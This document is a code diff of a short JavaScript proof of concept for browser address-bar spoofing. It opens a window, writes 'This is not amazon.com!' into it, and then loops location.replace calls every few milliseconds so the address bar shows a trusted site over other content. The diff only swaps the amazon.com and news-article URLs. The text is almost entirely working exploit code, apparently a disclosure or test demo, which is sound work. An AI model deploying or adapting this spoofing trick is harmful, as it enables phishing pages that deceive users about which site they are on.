@@ -1,7 +1,7 @@
 
 <script>
   function next() {
-      w.location.replace('https://amazon.com/?' + n);
+      w.location.replace('https://www.linternaute.com/actualite/monde/1784275-naufrage-du-grande-america-des-risques-pour-les-cotes-francaises/?' + n);
       n++;
       setTimeout("next();", 15);
       setTimeout("next();", 25);
@@ -10,7 +10,7 @@
   function f() {
     w = window.open("");
     w.document.write('<h2>This is not amazon.com!</h2>');
-    w.location = "https://www.linternaute.com/actualite/monde/1784275-naufrage-du-grande-america-des-risques-pour-les-cotes-francaises/";
+    w.location = "https://www.amazon.com/";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); n = 0; next(); }", 5);
   }
 </script>
